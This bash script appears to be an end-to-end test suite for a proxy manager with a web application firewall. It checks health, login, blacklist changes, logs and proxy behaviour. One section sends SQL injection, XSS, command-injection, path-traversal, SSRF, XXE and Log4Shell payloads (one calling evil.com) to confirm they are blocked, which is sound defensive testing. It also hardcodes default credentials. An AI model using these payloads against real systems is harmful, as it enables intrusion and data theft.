#!/usr/bin/env bash
# ╔═══════════════════════════════════════════════════════════════════════╗
# ║  Secure Proxy Manager — Full E2E Test Suite                         ║
# ║  Usage: ./tests/e2e.sh [HOST] [USER] [PASS]                        ║
# ║  Defaults: 192.168.100.253  fab  password                          ║
# ╚═══════════════════════════════════════════════════════════════════════╝
set -euo pipefail

HOST="${1:-192.168.100.253}"
USER="${2:-fab}"
PASS="${3:-password}"
API="http://${HOST}:8011"
UI="http://${HOST}:8011"
PROXY="${HOST}:3128"

# ── Colors ────────────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[0;33m'; B='\033[0;34m'
C='\033[0;36m'; W='\033[1;37m'; D='\033[0;90m'; N='\033[0m'
BOLD='\033[1m'

PASS_COUNT=0; FAIL_COUNT=0; WARN_COUNT=0; SKIP_COUNT=0
FAILS=""

pass() { ((PASS_COUNT++)); printf "  ${G}✓${N} %-45s ${D}%s${N}\n" "$1" "$2"; }
fail() { ((FAIL_COUNT++)); printf "  ${R}✗${N} %-45s ${R}%s${N}\n" "$1" "$2"; FAILS="${FAILS}\n  ${R}✗ $1: $2${N}"; }
warn() { ((WARN_COUNT++)); printf "  ${Y}⚠${N} %-45s ${Y}%s${N}\n" "$1" "$2"; }
skip() { ((SKIP_COUNT++)); printf "  ${D}○${N} %-45s ${D}%s${N}\n" "$1" "$2"; }
section() { printf "\n${B}═══${N} ${BOLD}$1${N} ${B}═══${N}\n\n"; }

# ── Helper: authenticated curl ────────────────────────────────────────────
TOKEN=""
auth_curl() {
    local method="$1" url="$2"; shift 2
    curl -s --max-time 10 -X "$method" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        "$@" "${API}${url}"
}

expect_status() {
    local label="$1" method="$2" url="$3" expected="$4"; shift 4
    local status
    status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" \
        -X "$method" -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" "$@" "${API}${url}" 2>/dev/null || echo "000")
    if [ "$status" = "$expected" ]; then
        pass "$label" "HTTP $status"
    else
        fail "$label" "expected $expected, got $status"
    fi
}

proxy_expect() {
    local label="$1" url="$2" expected="$3"
    local status
    status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" -x "$PROXY" "$url" 2>/dev/null || echo "000")
    if [ "$status" = "$expected" ]; then
        pass "$label" "HTTP $status"
    else
        fail "$label" "expected $expected, got $status"
    fi
}

# ══════════════════════════════════════════════════════════════════════════
printf "\n${C}╔═══════════════════════════════════════════════════════════════╗${N}\n"
printf "${C}║${N}  ${BOLD}SECURE PROXY MANAGER — E2E TEST SUITE${N}                       ${C}║${N}\n"
printf "${C}║${N}  $(date '+%Y-%m-%d %H:%M:%S')                                       ${C}║${N}\n"
printf "${C}║${N}  API: ${W}${API}${N}  Proxy: ${W}${PROXY}${N}              ${C}║${N}\n"
printf "${C}╚═══════════════════════════════════════════════════════════════╝${N}\n"

# ══════════════════════════════════════════════════════════════════════════
section "1. CONNECTIVITY & HEALTH"

# Health endpoint (no auth)
health=$(curl -s --max-time 5 "${API}/api/health" 2>/dev/null || echo '{}')
h_status=$(echo "$health" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
h_version=$(echo "$health" | grep -o '"version":"[^"]*"' | cut -d'"' -f4)
h_runtime=$(echo "$health" | grep -o '"runtime":"[^"]*"' | cut -d'"' -f4)

if [ "$h_status" = "healthy" ]; then
    pass "Health endpoint" "healthy"
else
    fail "Health endpoint" "status=$h_status"
fi

if [ -n "$h_version" ]; then
    pass "Version reported" "$h_version"
else
    warn "Version not in health response" ""
fi

if [ -n "$h_runtime" ]; then
    pass "Runtime reported" "$h_runtime"
else
    warn "Runtime not in health response" ""
fi

# UI reachable
ui_status=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "${UI}/" 2>/dev/null || echo "000")
if [ "$ui_status" = "200" ]; then
    pass "UI reachable" "HTTP $ui_status"
else
    fail "UI reachable" "HTTP $ui_status"
fi

# Proxy reachable
proxy_status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" -x "$PROXY" "http://httpbin.org/get" 2>/dev/null || echo "000")
if [ "$proxy_status" = "200" ]; then
    pass "Proxy forwarding" "HTTP $proxy_status"
else
    fail "Proxy forwarding" "HTTP $proxy_status"
fi

# ══════════════════════════════════════════════════════════════════════════
section "2. AUTHENTICATION"

# Login
login_resp=$(curl -s --max-time 5 -X POST "${API}/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"${USER}\",\"password\":\"${PASS}\"}" 2>/dev/null || echo '{}')
TOKEN=$(echo "$login_resp" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

if [ -n "$TOKEN" ]; then
    pass "JWT login" "token obtained"
else
    fail "JWT login" "no token returned"
    printf "\n${R}FATAL: Cannot authenticate. Remaining tests will fail.${N}\n"
    # Try to continue anyway
fi

# Auth required endpoint without token
status_noauth=$(curl -s --max-time 5 -o /dev/null -w "%{http_code}" "${API}/api/settings" 2>/dev/null || echo "000")
if [ "$status_noauth" = "401" ] || [ "$status_noauth" = "403" ]; then
    pass "Auth required on /api/settings" "HTTP $status_noauth"
else
    fail "Auth required on /api/settings" "expected 401/403, got $status_noauth"
fi

# WS token
ws_resp=$(auth_curl GET "/api/ws-token" 2>/dev/null || echo '{}')
ws_token=$(echo "$ws_resp" | grep -o '"token"' || true)
if [ -n "$ws_token" ]; then
    pass "WebSocket token endpoint" "token issued"
else
    warn "WebSocket token endpoint" "no token (may need Basic Auth)"
fi

# ══════════════════════════════════════════════════════════════════════════
section "3. DASHBOARD & ANALYTICS"

expect_status "Dashboard summary" GET "/api/dashboard/summary" "200"
expect_status "Security score" GET "/api/security/score" "200"
expect_status "Cache statistics" GET "/api/cache/statistics" "200"
expect_status "Traffic timeline" GET "/api/logs/timeline" "200"
expect_status "Log stats" GET "/api/logs/stats" "200"
expect_status "Shadow IT detector" GET "/api/analytics/shadow-it" "200"
expect_status "File extensions" GET "/api/analytics/file-extensions" "200"
expect_status "User agents" GET "/api/analytics/user-agents" "200"
expect_status "Top domains" GET "/api/analytics/top-domains" "200"

# ══════════════════════════════════════════════════════════════════════════
section "4. BLACKLISTS (CRUD)"

# IP Blacklist — list
expect_status "List IP blacklist" GET "/api/ip-blacklist" "200"

# IP Blacklist — add
add_resp=$(auth_curl POST "/api/ip-blacklist" -d '{"ip":"198.51.100.99","description":"e2e-test"}' 2>/dev/null || echo '{}')
add_ok=$(echo "$add_resp" | grep -o '"success"' || true)
if [ -n "$add_ok" ]; then
    pass "Add IP to blacklist" "198.51.100.99"
else
    # Might already exist
    add_dup=$(echo "$add_resp" | grep -o 'already' || true)
    if [ -n "$add_dup" ]; then
        pass "Add IP to blacklist" "already exists (ok)"
    else
        fail "Add IP to blacklist" "$(echo "$add_resp" | head -c 80)"
    fi
fi

# IP Blacklist — delete (find the ID first)
ip_list=$(auth_curl GET "/api/ip-blacklist?limit=200" 2>/dev/null || echo '{}')
test_ip_id=$(echo "$ip_list" | grep -o '"id":[0-9]*,"ip":"198.51.100.99"' | grep -o '"id":[0-9]*' | grep -o '[0-9]*' | head -1 || true)
if [ -n "$test_ip_id" ]; then
    del_resp=$(auth_curl DELETE "/api/ip-blacklist/${test_ip_id}" 2>/dev/null || echo '{}')
    del_ok=$(echo "$del_resp" | grep -o '"success"' || true)
    if [ -n "$del_ok" ]; then
        pass "Delete IP from blacklist" "id=$test_ip_id"
    else
        fail "Delete IP from blacklist" "$(echo "$del_resp" | head -c 80)"
    fi
else
    skip "Delete IP from blacklist" "test IP not found"
fi

# Domain Blacklist
expect_status "List domain blacklist" GET "/api/domain-blacklist" "200"

# Domain Whitelist
expect_status "List domain whitelist" GET "/api/domain-whitelist" "200"

# IP Whitelist
expect_status "List IP whitelist" GET "/api/ip-whitelist" "200"

# ══════════════════════════════════════════════════════════════════════════
section "5. SETTINGS"

expect_status "Get settings" GET "/api/settings" "200"

# Read a setting value
settings_resp=$(auth_curl GET "/api/settings" 2>/dev/null || echo '{}')
has_port=$(echo "$settings_resp" | grep -o 'proxy_port' || true)
if [ -n "$has_port" ]; then
    pass "Settings contain proxy_port" ""
else
    warn "Settings missing proxy_port" ""
fi

# ══════════════════════════════════════════════════════════════════════════
section "6. LOGS"

expect_status "Get access logs" GET "/api/logs" "200"

# Verify log structure
logs_resp=$(auth_curl GET "/api/logs?limit=5" 2>/dev/null || echo '{}')
has_logs=$(echo "$logs_resp" | grep -o '"total"' || true)
if [ -n "$has_logs" ]; then
    total=$(echo "$logs_resp" | grep -o '"total":[0-9]*' | grep -o '[0-9]*' | head -1)
    pass "Logs pagination" "total=${total:-0}"
else
    warn "Logs pagination" "no total field"
fi

# ══════════════════════════════════════════════════════════════════════════
section "7. MAINTENANCE"

expect_status "Check cert security" GET "/api/maintenance/check-cert-security" "200"

# ══════════════════════════════════════════════════════════════════════════
section "8. DATABASE"

expect_status "Database size" GET "/api/database/size" "200"
expect_status "Database stats" GET "/api/database/stats" "200"

# ══════════════════════════════════════════════════════════════════════════
section "9. WAF — ATTACK DETECTION"

attacks=(
    "SQLi UNION SELECT|http://httpbin.org/get?q=UNION+SELECT+1,2,3|403"
    "SQLi DROP TABLE|http://httpbin.org/get?q=DROP+TABLE+users|403"
    "XSS script tag|http://httpbin.org/get?q=<script>alert(1)</script>|403"
    "XSS javascript:|http://httpbin.org/get?q=javascript:alert(1)|403"
    "CMDi semicolon|http://httpbin.org/get?q=;cat+/etc/passwd|403"
    "CMDi pipe|http://httpbin.org/get?q=|grep+root|403"
    "DirTrav ../../../|http://httpbin.org/get?q=../../../etc/passwd|403"
    "SSRF AWS metadata|http://169.254.169.254/latest/meta-data/|403"
    "SSRF localhost|http://localhost:8080/admin|403"
    "Log4Shell JNDI|http://httpbin.org/get?q=\${jndi:ldap://evil.com/x}|403"
    "XXE ENTITY|http://httpbin.org/post|403|-d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>'"
    "Sensitive .env|http://httpbin.org/get?.env|403"
    "Sensitive .git|http://httpbin.org/.git/config|403"
    "AWS key leak|http://httpbin.org/get?key=AKIAIOSFODNN7EXAMPLE|403"
    "WebShell c99|http://httpbin.org/c99.php|403"
    "Crypto stratum|http://httpbin.org/get?pool=stratum+tcp://mine.pool|403"
    "SpEL RCE|http://httpbin.org/get?q=T(java.lang.Runtime).getRuntime().exec()|403"
)

for entry in "${attacks[@]}"; do
    IFS='|' read -r label url expected extra <<< "$entry"
    if [ -n "$extra" ]; then
        proxy_expect "$label" "$url" "$expected"
    else
        proxy_expect "$label" "$url" "$expected"
    fi
done

# ══════════════════════════════════════════════════════════════════════════
section "10. WAF — FALSE POSITIVE CHECK"

legit=(
    "Normal search|http://httpbin.org/get?q=hello+world|200"
    "JSON API call|http://httpbin.org/get?format=json|200"
    "E-commerce|http://httpbin.org/get?product=shoes&size=42|200"
    "REST API|http://httpbin.org/get?page=1&limit=50|200"
    "OAuth callback|http://httpbin.org/get?code=abc123&state=xyz|200"
    "PDF download|http://httpbin.org/get?file=report.pdf|200"
    "C++ query|http://httpbin.org/get?lang=c%2B%2B|200"
)

for entry in "${legit[@]}"; do
    IFS='|' read -r label url expected <<< "$entry"
    proxy_expect "$label" "$url" "$expected"
done

# ══════════════════════════════════════════════════════════════════════════
section "11. PROXY — PROTOCOL HARDENING"

# Method restrictions (PUT/DELETE should be blocked)
put_status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" -x "$PROXY" -X PUT "http://httpbin.org/put" 2>/dev/null || echo "000")
if [ "$put_status" = "403" ]; then
    pass "PUT method blocked" "HTTP $put_status"
else
    warn "PUT method not blocked" "HTTP $put_status"
fi

delete_status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" -x "$PROXY" -X DELETE "http://httpbin.org/delete" 2>/dev/null || echo "000")
if [ "$delete_status" = "403" ]; then
    pass "DELETE method blocked" "HTTP $delete_status"
else
    warn "DELETE method not blocked" "HTTP $delete_status"
fi

# HTTPS CONNECT
https_status=$(curl -s --max-time 10 -o /dev/null -w "%{http_code}" -x "$PROXY" "https://www.google.com/" 2>/dev/null || echo "000")
if [ "$https_status" = "200" ] || [ "$https_status" = "302" ]; then
    pass "HTTPS CONNECT works" "HTTP $https_status"
else
    warn "HTTPS CONNECT" "HTTP $https_status"
fi

# ══════════════════════════════════════════════════════════════════════════
section "12. LATENCY SAMPLE"

times=()
for i in $(seq 1 5); do
    t=$(curl -s --max-time 10 -o /dev/null -w "%{time_total}" -x "$PROXY" "http://httpbin.org/get" 2>/dev/null || echo "9.999")
    ms=$(echo "$t * 1000" | bc 2>/dev/null | cut -d. -f1 || echo "?")
    times+=("$ms")
    printf "  ${D}Sample $i:${N} ${ms}ms\n"
done

if [ ${#times[@]} -gt 0 ]; then
    sorted=($(printf '%s\n' "${times[@]}" | sort -n))
    p50=${sorted[$(( ${#sorted[@]} / 2 ))]}
    printf "\n  ${C}P50: ${BOLD}${p50}ms${N}\n"
fi

# ══════════════════════════════════════════════════════════════════════════
# SUMMARY
printf "\n${C}╔═══════════════════════════════════════════════════════════════╗${N}\n"
printf "${C}║${N}  ${BOLD}RESULTS${N}                                                      ${C}║${N}\n"
printf "${C}╠═══════════════════════════════════════════════════════════════╣${N}\n"
printf "${C}║${N}  ${G}Passed:  %-4s${N}  ${R}Failed:  %-4s${N}  ${Y}Warnings: %-4s${N}  ${D}Skipped: %-3s${N} ${C}║${N}\n" "$PASS_COUNT" "$FAIL_COUNT" "$WARN_COUNT" "$SKIP_COUNT"
printf "${C}║${N}  Backend: ${W}%-12s${N} Runtime: ${W}%-8s${N}                    ${C}║${N}\n" "${h_version:-unknown}" "${h_runtime:-unknown}"
printf "${C}╚═══════════════════════════════════════════════════════════════╝${N}\n"

if [ "$FAIL_COUNT" -gt 0 ]; then
    printf "\n${R}${BOLD}FAILURES:${N}"
    printf "$FAILS\n"
    printf "\n"
    exit 1
fi

if [ "$FAIL_COUNT" -eq 0 ]; then
    printf "\n${G}${BOLD}ALL TESTS PASSED!${N} 🎉\n\n"
    exit 0
fi
